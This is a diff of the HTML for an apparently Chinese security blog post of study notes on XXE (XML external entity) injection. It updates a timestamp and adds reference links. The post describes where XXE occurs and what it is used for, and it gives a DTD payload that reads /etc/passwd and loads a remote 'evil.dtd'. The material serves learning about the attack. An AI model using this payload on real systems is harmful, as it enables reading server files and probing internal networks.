@@ -100,7 +100,7 @@
 <meta property="og:site_name" content="Yiruma">
 <meta property="og:description" content="XXE攻击的场景以及用途 XXE产生的原因 （基础学习）XML文档类型定义部分————dtd的说明 基于回显的XXE攻击 无回显的Blind XXE攻击 基于XXE的其他攻击 参考文章">
 <meta property="og:image" content="http://i.imgur.com/CGNfRmF.png">
-<meta property="og:updated_time" content="2017-10-01T16:42:26.469Z">
+<meta property="og:updated_time" content="2017-11-02T10:54:55.406Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XXE学习笔记">
 <meta name="twitter:description" content="XXE攻击的场景以及用途 XXE产生的原因 （基础学习）XML文档类型定义部分————dtd的说明 基于回显的XXE攻击 无回显的Blind XXE攻击 基于XXE的其他攻击 参考文章">
@@ -374,7 +374,9 @@
 <li>基于XXE的其他攻击</li>
 <li>参考文章</li>
 </ul>
-<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><h2 id="XXE攻击的场景以及用途"><a href="#XXE攻击的场景以及用途" class="headerlink" title="XXE攻击的场景以及用途"></a>XXE攻击的场景以及用途</h2><p>在一切对XML文件进行解析的场景中，都有可能出现XXE注入。像XML文件作为配置文件（spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）,soap通信通信格式，甚至有道题目的参数为<user><name>Yiruma</name></user>处理中也涉及到了对xml文件的解析，此外，网上有一些在线XML格式化工具，还有一ctf题目中的将csv文件转化为xml文件的功能，都可能涉及到不安全的XML文件解析从而存在攻击点<br>说到XXE攻击的常见用途有：实现文件包含，重复定义引用（仿递归）的DDOS攻击，外部文件引用，内网探测，待补充。。。。</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><p><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="external">https://thief.one/2017/06/20/1/</a></p>
+<p><a href="http://www.freebuf.com/articles/web/97833.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/97833.html</a></p>
+<h2 id="XXE攻击的场景以及用途"><a href="#XXE攻击的场景以及用途" class="headerlink" title="XXE攻击的场景以及用途"></a>XXE攻击的场景以及用途</h2><p>在一切对XML文件进行解析的场景中，都有可能出现XXE注入。像XML文件作为配置文件（spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）,soap通信通信格式，甚至有道题目的参数为<user><name>Yiruma</name></user>处理中也涉及到了对xml文件的解析，此外，网上有一些在线XML格式化工具，还有一ctf题目中的将csv文件转化为xml文件的功能，都可能涉及到不安全的XML文件解析从而存在攻击点<br>说到XXE攻击的常见用途有：实现文件包含，重复定义引用（仿递归）的DDOS攻击，外部文件引用，内网探测，待补充。。。。</p>
 <h2 id="XXE产生的原因"><a href="#XXE产生的原因" class="headerlink" title="XXE产生的原因"></a>XXE产生的原因</h2><p>在有对XML文件进行解析的地方，如果使用了不安全的XML解析函数如php的simplexml_load_string()，对外部实体进行了解析下，就有可能引入不安全的参数，从而造成攻击。</p>
 <h2 id="（基础学习）XML文档类型定义部分————dtd的说明"><a href="#（基础学习）XML文档类型定义部分————dtd的说明" class="headerlink" title="（基础学习）XML文档类型定义部分————dtd的说明"></a>（基础学习）XML文档类型定义部分————dtd的说明</h2><p>首先给出一坨dtd以表明其结构<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE ANY[  </span></div><div class="line">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;  </div><div class="line">&lt;!ENTITY % evil SYSTEM "http://127.0.0.1/evil.dtd"&gt;  </div><div class="line">&lt;!ENTITY xie "xie"&gt;</div><div class="line">%remote;  </div><div class="line">%send;  </div><div class="line">]&gt;</div></pre></td></tr></table></figure></p>
 <p><strong>在dtd里面可以通过&lt;!ENTITY [SYSTEM] xxxx&gt;定义两种参数———参数实体与一般实体。</strong></p>
